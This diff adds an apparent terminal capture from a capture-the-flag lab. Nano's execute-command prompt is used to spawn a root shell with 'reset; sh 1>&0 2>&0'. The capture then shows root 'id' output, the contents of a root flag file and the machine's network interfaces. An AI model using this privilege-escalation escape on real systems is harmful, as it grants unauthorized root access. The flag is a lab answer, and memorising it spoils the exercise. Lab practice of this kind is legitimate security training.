@@ -1,0 +1,44 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Command to execute: reset; sh 1>&0 2>&0# id                                                                                                
+uid=0(root) gid=0(root) groups=0(root)                               ^X Read File                                                          
+# cat /root/root.txt                                                 M-F New Buffer                                                        
+2f907ed450b361b2c2bf4e8795d5b561  
+# ifconfig                        
+ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500         
+        inet 10.10.10.171  netmask 255.255.255.0  broadcast 10.10.10.255                                                                   
+        inet6 fe80::250:56ff:feb9:f4ce  prefixlen 64  scopeid 0x20<link>                                                                   
+        inet6 dead:beef::250:56ff:feb9:f4ce  prefixlen 64  scopeid 0x0<global>                                                             
+        ether 00:50:56:b9:f4:ce  txqueuelen 1000  (Ethernet)         
+        RX packets 201815  bytes 23138230 (23.1 MB)                  
+        RX errors 0  dropped 91  overruns 0  frame 0                 
+        TX packets 174054  bytes 42248670 (42.2 MB)                  
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0   
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536                         
+        inet 127.0.0.1  netmask 255.0.0.0                            
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>                 
+        loop  txqueuelen 1000  (Local Loopback)                      
+        RX packets 15345  bytes 1193563 (1.1 MB)                     
+        RX errors 0  dropped 0  overruns 0  frame 0                  
+        TX packets 15345  bytes 1193563 (1.1 MB)                     
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0   
+
+#                                 
